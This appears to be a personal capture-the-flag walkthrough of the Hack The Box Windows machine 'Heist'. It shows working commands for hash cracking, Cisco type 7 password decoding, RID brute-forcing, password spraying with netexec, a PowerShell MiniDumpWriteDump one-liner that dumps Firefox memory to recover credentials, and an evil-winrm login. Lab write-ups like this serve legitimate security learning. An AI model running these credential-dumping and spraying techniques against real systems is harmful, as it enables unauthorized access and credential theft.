
#### About

Heist is an easy difficulty Windows box with an &amp;quot;Issues&amp;quot; portal accessible on the web server, from which it is possible to gain Cisco password hashes. These hashes are cracked, and subsequently RID bruteforce and password spraying are used to gain a foothold on the box. The user is found to be running Firefox. The firefox.exe process can be dumped and searched for the administrator&amp;#039;s password.


## Nmap

```
nmap -sC -sV -sT -p- -v 10.129.96.157
```

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-29T20:34:56
|_  start_date: N/A
```

## Portal

I found this portal
![](pics/Pasted%20image%2020260829233422.png)

Clicked on Login as a guest
![](pics/Pasted%20image%2020260829233407.png)

Opened the attachment file
![](pics/Pasted%20image%2020260829233500.png)

Extracted data a hash and usernames (I did not know there was multiple hashes ATM)
```
version 12.2
security passwords min-length 12


Found this hash: $1$pdQG$o8nrSzsGXeaduXrjlvKc91

Users:
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

## Cracking the hash


```
hashcat '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' /usr/share/wordlists/rockyou.txt
```
![](pics/Pasted%20image%2020260829234512.png)

Extracted password
```
stealth1agent
```
But I do not have a username....So I tried the users `rout3r` and `admin` as a starting point.
![](pics/Pasted%20image%2020260829235308.png)
## Found the user

By reading this messages I knew it, got him.

![](pics/Pasted%20image%2020260829235212.png)

I tried via netexec:
![](pics/Pasted%20image%2020260829235323.png)
Nice!


## Enum shares

```
nxc smb 10.129.96.157 -u hazard -p stealth1agent --shares
```

![](pics/Pasted%20image%2020260829235522.png)

## RID enum

```
netexec smb 10.129.96.157 -u hazard -p stealth1agent --rid-brute
```
![](pics/Pasted%20image%2020260830000710.png)

```bash
netexec smb 10.129.96.157 -u hazard -p stealth1agent --rid-brute | grep -oE 'SUPPORTDESK[\0-9a-zA-Z]+'
```

filter for better visibility
```
SUPPORTDESK\Administrator
SUPPORTDESK\Guest
SUPPORTDESK\DefaultAccount
SUPPORTDESK\WDAGUtilityAccount
SUPPORTDESK\None
SUPPORTDESK\Hazard
SUPPORTDESK\support
SUPPORTDESK\Chase
SUPPORTDESK\Jason
```

## Spraying users

After spending time spraying users with common passwords, I decided that I am missing something so I have gone thru my tracks I researched cisco password configuration:
![](pics/Pasted%20image%2020260830005229.png)

Know I understand that the weird numbers I found for those users are actual encrypted passwords using a tool I found in github called `cisco7`:
```
python3 ciscot7.py -p 0242114B0E143F015F5D1E161713
python3 ciscot7.py -p 02375012182C1A1D751618034F36415408
```

![](pics/Pasted%20image%2020260830005441.png)

```
rout3r: $uperP@ssword
admin : Q4)sJu\Y8qz*A3?d
```

Let me try to spray with these
![](pics/Pasted%20image%2020260830005706.png)

Got it
```
Chase:Q4)sJu\Y8qz*A3?d 
```

## Flag 1

![](pics/Pasted%20image%2020260830005858.png)

Just a funny note
![](pics/Pasted%20image%2020260830005946.png)


## PrivEsc


I see firefox is running on the machine
![](pics/Pasted%20image%2020260830010709.png)

```
  355      24    16504      38856       0.13   3884   1 firefox
   1073      69   139548     216204       5.06   6412   1 firefox
    347      19    10196      38528       0.11   6412   1 firefox
    401      33    31296      89872       0.67   6684   1 firefox
    378      28    22024      58320       0.28   6964   1 firefox

```
Get process memory dump executable to the machine
```
upload /opt/SharpCollection/NetFramework_4.7_Any/SharpDump.exe procD.exe
```

Failed to dump the memory because I do not have permission to write to the temp directory
![](pics/Pasted%20image%2020260830011809.png)


figure out which one is the main thread
```
Get-Process -Name firefox | Select-Object Id, ProcessName, @{Name="WorkingSet_MB";Expression={[math]::Round($_.WorkingSet / 1MB, 2)}} | Sort-Object WorkingSet_MB -Descending
```
![](pics/Pasted%20image%2020260830020048.png)
The largest.


Then I used native powershell command to dump the process memory to a file
```powershell
$TargetPID=6412; $Path="$Home\Desktop\firefox_6412.dmp"; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Dump { [DllImport("dbghelp.dll")] public static extern bool MiniDumpWriteDump(IntPtr hP, uint pID, SafeHandle hF, uint dT, IntPtr eP, IntPtr uS, IntPtr cP); }'; $P=[System.Diagnostics.Process]::GetProcessById($TargetPID); $FS=New-Object System.IO.FileStream($Path,[System.IO.FileMode]::Create); if([Dump]::MiniDumpWriteDump($P.Handle,$TargetPID,$FS.SafeFileHandle,2,0,0,0)){echo "Success: $Path"}else{echo "Failed"}; $FS.Close()
```
Then using grep
```
strings firefox_6412.mem | grep password
```
![](pics/Pasted%20image%2020260830020240.png)


```
username = administrator
password = 4dD!5}x/re8]FBuZ
```

## Flag 2

```
evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ'
```
![](pics/Pasted%20image%2020260830020545.png)

Done!
![](pics/Pasted%20image%2020260830020612.png)

